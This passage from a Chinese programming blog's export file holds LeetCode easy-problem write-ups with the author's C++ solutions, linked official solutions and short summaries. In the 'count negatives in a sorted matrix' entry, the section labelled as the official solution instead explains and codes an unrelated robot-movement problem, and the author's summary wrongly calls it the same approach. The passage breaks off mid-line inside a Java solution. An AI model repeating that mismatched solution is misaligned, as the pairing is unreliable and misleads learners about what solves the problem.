<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定仅有小写字母组成的字符串数组 <code>A</code>，返回列表中的每个字符串中都显示的全部字符（<strong>包括重复字符</strong>）组成的列表。例如，如果一个字符在每个字符串中出现 3 次，但不是 4 次，则需要在最终答案中包含该字符 3 次。</p>
<p>你可以按任意顺序返回答案。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;bella&quot;,&quot;label&quot;,&quot;roller&quot;]</span><br><span class="line">输出：[&quot;e&quot;,&quot;l&quot;,&quot;l&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[&quot;cool&quot;,&quot;lock&quot;,&quot;cook&quot;]</span><br><span class="line">输出：[&quot;c&quot;,&quot;o&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 100</code></li>
<li><code>1 &lt;= A[i].length &lt;= 100</code></li>
<li><code>A[i][j]</code> 是小写字母</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>就是查找多个字符串中的交集（都有的字符），以一个字符串为主进行遍历，然后依次判断每个字符是否在其它字符串中存在，有则添加到结果中并在其它字符串中删除该字符（防止一个字符匹配多次），否则终止进行下一个字符判断。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败96.77%，内存消耗9M，击败75.28%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">commonChars</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result;</span><br><span class="line">        <span class="comment">//遍历数组A中的第一个元素中的字符（A.length()&gt;=1），其实遍历A中长度最小的元素比较好</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> i:A[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="comment">//在其它元素中依次查找A[0]中的字符是否存在</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;A.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(A[j].find(i)!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">                    <span class="comment">//删除找到的字符</span></span><br><span class="line">                    A[j].erase(A[j].find(i),<span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(j==A.size()<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="comment">//该字符在所有元素中都存在</span></span><br><span class="line">                        <span class="comment">//把字符i转成字符串</span></span><br><span class="line">                        result.push_back(<span class="built_in">string</span>(<span class="number">1</span>,i));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//若某个元素中没有这个字符则跳出循环，即该字符不满足要求</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-common-characters/solution/cha-zhao-chang-yong-zi-fu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：计数</strong></p>
<p><strong>思路与算法</strong></p>
<p>根据题目的要求，如果字符 cc 在所有字符串中均出现了 $k$ 次及以上，那么最终答案中需要包含 $k$ 个 $c$。因此，我们可以使用 $\textit{minfreq}[c]$ 存储字符 $c$ 在所有字符串中出现次数的最小值。</p>
<p>我们可以依次遍历每一个字符串。当我们遍历到字符串 $s$ 时，我们使用 $\textit{freq}[c]$ 统计 ss 中每一个字符 $c$ 出现的次数。在统计完成之后，我们再将每一个 $\textit{minfreq}[c]$ 更新为其本身与 $\textit{freq}[c]$ 的较小值。这样一来，当我们遍历完所有字符串后，$\textit{minfreq}[c]$ 就存储了字符 $c$ 在所有字符串中出现次数的最小值。</p>
<p>由于题目保证了所有的字符均为小写字母，因此我们可以用长度为 $26$ 的数组分别表示 $\textit{minfreq}$ 以及 $\textit{freq}$。</p>
<p>在构造最终的答案时，我们遍历所有的小写字母 $c$，并将 $\textit{minfreq}[c]$个 $c$ 添加进答案数组即可。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败76.58%，内存消耗9.1M，击败51.59%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">commonChars</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">minfreq</span><span class="params">(<span class="number">26</span>, INT_MAX)</span></span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">freq</span><span class="params">(<span class="number">26</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="built_in">string</span>&amp; word: A) &#123;</span><br><span class="line">            fill(freq.begin(), freq.end(), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">char</span> ch: word) &#123;</span><br><span class="line">                ++freq[ch - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">                minfreq[i] = min(minfreq[i], freq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; minfreq[i]; ++j) &#123;</span><br><span class="line">                ans.emplace_back(<span class="number">1</span>, i + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(n(m+|\Sigma|))$，其中 $n$ 是数组 $A$的长度（即字符串的数目），$m$是字符串的平均长度，$\Sigma$ 为字符集，在本题中字符集为所有小写字母，$|\Sigma|=26$。</p>
<p>遍历所有字符串并计算 $\textit{freq}$的时间复杂度为 $O(nm)$；<br>使用 $\textit{freq}$ 更新 $\textit{minfreq}$ 的时间复杂度为 $O(n|\Sigma|)$；<br>由于最终答案包含的字符个数不会超过最短的字符串长度，因此构造最终答案的时间复杂度为 $O(m+|\Sigma|)$。这一项在渐进意义上小于前二者，可以忽略。<br>空间复杂度：$O(|\Sigma|)$，这里只计算存储答案之外的空间。我们使用了数组 $\textit{freq}$freq 和 $\textit{minfreq}$，它们的长度均为 $|\Sigma|$。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解使用的又是计数法，遇到好多题都有计数法，我倒是没用过计数法🤣，还是比较喜欢用最直观的解法，效率也不错。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最外层的括号</title>
    <url>/2020/11/13/%E6%9C%80%E5%A4%96%E5%B1%82%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/remove-outermost-parentheses/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>有效括号字符串为空 <code>(&quot;&quot;)</code>、<code>&quot;(&quot; + A + &quot;)&quot;</code> 或 <code>A + B</code>，其中 <code>A</code> 和 <code>B</code> 都是有效的括号字符串，+ 代表字符串的连接。例如，<code>&quot;&quot;</code>，<code>&quot;()&quot;</code>，<code>&quot;(())()&quot;</code> 和 <code>&quot;(()(()))&quot;</code> 都是有效的括号字符串。</p>
<p>如果有效字符串 S 非空，且不存在将其拆分为 <code>S = A+B</code> 的方法，我们称其为<strong>原语（primitive）</strong>，其中 <code>A</code> 和 <code>B</code> 都是非空有效括号字符串。</p>
<p>给出一个非空有效字符串 <code>S</code>，考虑将其进行原语化分解，使得：<code>S = P_1 + P_2 + ... + P_k</code>，其中 <code>P_i</code> 是有效括号字符串原语。</p>
<p>对 <code>S</code> 进行原语化分解，删除分解中每个原语字符串的最外层括号，返回 <code>S</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;(()())(())&quot;</span><br><span class="line">输出：&quot;()()()&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;(()())(())&quot;，原语化分解得到 &quot;(()())&quot; + &quot;(())&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;()()&quot; + &quot;()&quot; &#x3D; &quot;()()()&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;(()())(())(()(()))&quot;</span><br><span class="line">输出：&quot;()()()()(())&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;(()())(())(()(()))&quot;，原语化分解得到 &quot;(()())&quot; + &quot;(())&quot; + &quot;(()(()))&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;()()&quot; + &quot;()&quot; + &quot;()(())&quot; &#x3D; &quot;()()()()(())&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;()()&quot;</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;()()&quot;，原语化分解得到 &quot;()&quot; + &quot;()&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;&quot; + &quot;&quot; &#x3D; &quot;&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>S.length &lt;= 10000</code></li>
<li><code>S[i]</code> 为 <code>&quot;(&quot;</code> 或 <code>&quot;)&quot;</code></li>
<li><code>S</code> 是一个有效括号字符串</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用STL模板库中的stack，左括号’(‘入栈，右括号’)’出栈。遍历字符串的每一个字符，判断是否是最外层括号，只需要判断栈中是否只有一个左括号’(‘且下一个元素是右括号’)’。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败86.98%，内存消耗6.8M，击败58.35%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">removeOuterParentheses</span><span class="params">(<span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;S.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(st.empty())&#123;</span><br><span class="line">                <span class="comment">//若栈空，则入栈</span></span><br><span class="line">                st.push(S[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//若栈元素个数为1</span></span><br><span class="line">                <span class="keyword">if</span>(st.top()==S[i])&#123;</span><br><span class="line">                    <span class="comment">//栈中元素与当前字符相同，则继续入栈,并把当前字符存到结果字符串中</span></span><br><span class="line">                    st.push(S[i]);</span><br><span class="line">                    result+=S[i];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//与栈中元素不同，也就是说是匹配的括号(),出栈</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                    <span class="comment">//不是最外层括号，存到结果中</span></span><br><span class="line">                    <span class="keyword">if</span>(!st.empty())&#123;</span><br><span class="line">                        result+=S[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也挺简单的，不聊了。😏</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>统计有序矩阵中的负数</title>
    <url>/2020/11/13/%E7%BB%9F%E8%AE%A1%E6%9C%89%E5%BA%8F%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B4%9F%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个 <code>m * n</code> 的矩阵 <code>grid</code>，矩阵中的元素无论是按行还是按列，都以非递增顺序排列。 </p>
<p>请你统计并返回 <code>grid</code> 中 <strong>负数</strong> 的数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[4,3,2,-1],[3,2,1,-1],[1,1,-1,-2],[-1,-1,-2,-3]]</span><br><span class="line">输出：8</span><br><span class="line">解释：矩阵中共有 8 个负数。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[3,2],[1,0]]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[1,-1],[-1,-1]]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[-1]]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 100</code></li>
<li><code>-100 &lt;= grid[i][j] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>要是暴力点就直接遍历矩阵中所有的元素，统计负数的个数。</p>
<p>优雅点呢就是利用矩阵的特点，非递增排列（对每行每列前者&gt;=后者），遍历每一行，对每一个元素如果小于0，则该行其后元素都是负数。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败100.00%，内存消耗8.2M，击败29.59%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNegatives</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;grid.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;grid[i].size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                    result+=grid[i].size()-j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/solution/tong-ji-you-xu-ju-zhen-zhong-de-fu-shu-by-leetcode/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们只需按指令模拟机器人移动的坐标即可。起始时机器人的坐标为 $(0,0)$，在遍历完所有指令并对机器人进行移动之后，判断机器人的坐标是否为 $(0,0)$ 即可。</p>
<p>具体来说，我们用两个变量 xx 和 yy 来表示机器人当前所在的坐标为 $(x,y)$，起始时 $x=0$，$y=0$。接下来我们遍历指令并更新机器人的坐标：</p>
<p>如果指令是 $U$，则令 $y=y-1$<br>如果指令是 $D$，则令 $y=y+1$<br>如果指令是 $L$，则令 $x=x-1$<br>如果指令是 $R$，则令 $x=x+1$<br>最后判断 $(x,y)$ 是否为 $(0,0)$即可。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败97.42%，内存消耗8.3M，击败5.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeCircle</span><span class="params">(<span class="built_in">string</span> moves)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; move: moves) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">                y--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">                y++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                x--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x == <span class="number">0</span> &amp;&amp; y == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度： $O(N)$，其中 $N$ 表示 $\textit{moves}$ 指令串的长度。我们只需要遍历一遍字符串即可。</p>
</li>
<li><p>空间复杂度： $O(1)$。我们只需要常数的空间来存放若干变量。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过有值得学习的地方。第一点可以改用增强for循环，第二点return返回时使用逻辑表达式，不像我用了if判断😆，题目还比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>自除数</title>
    <url>/2020/11/13/%E8%87%AA%E9%99%A4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/self-dividing-numbers/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>自除数 是指可以被它包含的每一位数除尽的数。</p>
<p>例如，128 是一个自除数，因为 <code>128 % 1 == 0</code>，<code>128 % 2 == 0</code>，<code>128 % 8 == 0</code>。</p>
<p>还有，自除数不允许包含 0 。</p>
<p>给定上边界和下边界数字，输出一个列表，列表的元素是边界（含边界）内所有的自除数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： </span><br><span class="line">上边界left &#x3D; 1, 下边界right &#x3D; 22</span><br><span class="line">输出： [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 15, 22]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>每个输入参数的边界满足 <code>1 &lt;= left &lt;= right &lt;= 10000</code>。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接遍历给定范围内的数，依次判断是否为自除数。不为自除数的情况有两种，一种是某位数为0，一种是不能被某个位数除尽，直接模拟。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.9M，击败8.06%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=left;i&lt;=right;++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp=i;</span><br><span class="line">            <span class="keyword">while</span>(tmp)&#123;</span><br><span class="line">                <span class="comment">//某位数为0或者不能被该位数除尽，不是自除数</span></span><br><span class="line">                <span class="keyword">if</span>(tmp%<span class="number">10</span>==<span class="number">0</span> || i%(tmp%<span class="number">10</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tmp/<span class="number">10</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//最后一位数了,满足自除数条件</span></span><br><span class="line">                    result.push_back(i);</span><br><span class="line">                &#125;</span><br><span class="line">                tmp/=<span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/self-dividing-numbers/solution/zi-chu-shu-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：暴力法</strong></p>
<p><strong>算法：</strong></p>
<p>对于给定范围内的每个数，我们将直接判断该数是否为自除数。<br>根据定义，我们先判断数字是否非零，若数字非零再判断是否能够被该数除尽。例如，对于 128，我们要判断 <code>d != 0 &amp;&amp; 128 % d == 0</code>，且 <code>d = 1, 2, 8</code>。<br>解决这个问题的一个简单方法是将数字转换成一个字符数组（python 中的字符串），然后在检查 <code>n%d==0</code> 时转换回整数执行模运算。<br>我们还可以不断地把数字除以 <code>10</code>，取整数的最后一个数字。在代码中为注释的部分。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">selfDividingNumbers</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; ans = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n = left; n &lt;= right; ++n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (selfDividing(n)) ans.add(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">selfDividing</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c: String.valueOf(n).toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span> || (n % (c - <span 